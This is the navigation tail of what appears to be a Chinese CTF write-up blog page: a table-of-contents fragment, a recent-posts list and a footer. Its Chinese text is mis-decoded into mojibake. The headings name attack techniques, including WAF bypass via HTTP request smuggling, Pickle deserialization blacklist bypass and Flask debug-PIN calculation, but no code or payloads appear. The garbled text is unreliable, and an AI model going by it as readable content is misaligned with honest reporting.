class="toc-text">waf?waf!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Ahttp%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E9%80%A0%E6%88%90%E7%9A%84waf%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.5.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E5%8F%88%E5%8F%88%E6%98%AF%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.6.</span> <span class="toc-text">è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9APickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.4.6.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%BD%E5%83%8F%E4%BB%80%E4%B9%88%E9%83%BD%E8%83%BD%E8%AF%BB"><span class="toc-number">2.4.7.</span> <span class="toc-text">å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Aflask%E8%AE%A1%E7%AE%97pin%E7%A0%81%EF%BC%8C%E6%96%B0%E7%89%88%E6%9C%ACWerkzeug%E7%9A%84tip"><span class="toc-number">2.4.7.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/15956.html" title="é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf">é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf</a><time datetime="2025-11-15T15:27:43.000Z" title="å‘è¡¨äº 2025-11-15 23:27:43">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/55713.html" title="é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹jsé€†å‘åŸºç¡€">é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹jsé€†å‘åŸºç¡€</a><time datetime="2025-11-05T14:12:56.000Z" title="å‘è¡¨äº 2025-11-05 22:12:56">2025-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/33318.html" title="ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹xss">ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹xss</a><time datetime="2025-10-20T11:06:38.000Z" title="å‘è¡¨äº 2025-10-20 19:06:38">2025-10-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/63963.html" title="ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹moectf2025">ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹moectf2025</a><time datetime="2025-10-15T07:12:52.000Z" title="å‘è¡¨äº 2025-10-15 15:12:52">2025-10-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/12382.html" title="ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹phpcmsä»£ç å®¡è®¡">ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹phpcmsä»£ç å®¡è®¡</a><time datetime="2025-10-13T07:56:32.000Z" title="å‘è¡¨äº 2025-10-13 15:56:32">2025-10-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/2.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By é™ˆç¾½ç³</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>